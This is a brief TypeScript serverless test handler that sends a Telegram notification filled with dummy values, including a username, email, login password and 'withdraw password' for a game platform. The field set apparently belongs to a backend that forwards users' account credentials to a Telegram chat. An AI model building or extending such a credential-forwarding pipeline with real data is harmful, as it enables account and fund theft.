import { sendTelegramNotification } from "./_notifications.js";

export default async function handler(req: any, res: any) {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");

  if (req.method === "OPTIONS") {
    return res.status(200).end();
  }

  const result = await sendTelegramNotification({
    gameName: "Test Platform (Vercel Test)",
    requestId: "TEST-" + Math.floor(100000 + Math.random() * 900000),
    usernameOrPhone: "demo_test_user",
    gmail: "admin@test.com",
    loginPassword: "demo_login_pass",
    newWithdrawPassword: "demo_withdraw_999",
    timestamp: new Date().toLocaleString("bn-BD"),
    companyName: process.env.COMPANY_NAME || "Vercel Telegram Test",
  });

  return res.status(200).json(result);
}
